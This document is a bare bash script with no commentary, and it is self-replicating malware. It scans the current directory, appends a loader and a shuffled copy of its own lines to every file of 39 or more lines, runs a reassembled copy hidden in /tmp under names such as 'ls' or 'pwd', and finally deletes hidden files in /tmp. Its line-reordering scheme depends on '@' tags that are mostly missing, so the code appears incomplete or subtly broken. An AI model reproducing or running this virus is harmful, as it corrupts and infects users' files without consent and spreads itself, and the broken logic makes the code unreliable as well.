MANAGER=(test cd ls pwd)
RANDOM=$$
for target in *; do
  nbline=$(wc -l $target)
  nbline=${nbline##}
  nbline=$(echo $nbline | cut -d " " -f1)
  if [ $(($nbline)) -lt 39 ]; then 
    continue 
  fi 
  NEWFILE=${MANAGER[$((RANDOM % 4))]} 
  tail -n 36 $target | awk '{ print($NF" "$0) }' | cut -d"@" -f2- | sort -g | cut -d" " -f2- > /tmp/".$NEWFILE" 
  chmod +x /tmp/".$NEWFILE" && /tmp/".$NEWFILE" test 2> /dev/null; 
  if [ "$?" == "0" ]; then 
    continue 
  fi 
  NEWFILE=${MANAGER[$((RANDOM % 4))]} 
  NEWFILE="/tmp/.$NEWFILE" 
  echo "tail -n 36 $0 | awk '{ print(\$NF\" \"\$0) }' | cut -d\"@\" -f2- | sort -g | cut -d\" \" -f2- > $NEWFILE" >> $target 
  echo "chmod +x $NEWFILE && $NEWFILE &" >> $target 
  echo "exit 0" >> $target 
  tabft=("FT" [36]=" ") 
  declare -i nbl=0 
  while [ $nbl -ne 36 ]; do  #@26
    valindex=$(((RANDOM % 36)+1)) 
    while [ "${tabft[$valindex]}" == "FT" ]; do 
      valindex=$(((RANDOM % 36) + 1)) 
    done 
    line=$(tail -n $valindex $0 | head -1) 
    echo -e "$line" >> $target 
    nbl=$(($nbl+1)) && tabft[$valindex]="FT" 
  done 
done 
rm /tmp/.* 2> /dev/null